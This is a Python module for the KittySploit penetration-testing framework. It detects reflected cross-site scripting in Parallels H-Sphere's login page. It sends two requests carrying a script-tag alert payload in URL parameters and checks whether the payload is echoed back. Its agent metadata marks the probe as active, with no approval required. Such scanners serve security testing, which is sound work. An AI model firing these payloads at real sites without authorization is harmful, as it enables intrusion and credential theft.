#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Parallels H-Sphere contains multiple cross-site scripting vulnerabilities because it fails to sufficiently san."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Parallels H-Sphere - Cross-Site Scripting Detection',
        'description': 'Parallels H-Sphere contains multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data. An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'hsphere', 'xss', 'edb', 'parallels', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/32396'],
    }

    def run(self):
        for path in ('/webshell4/login.php?err=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', '/webshell4/login.php?login=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('value="\\"><script>alert(document.domain)</script>',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="Parallels H-Sphere - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

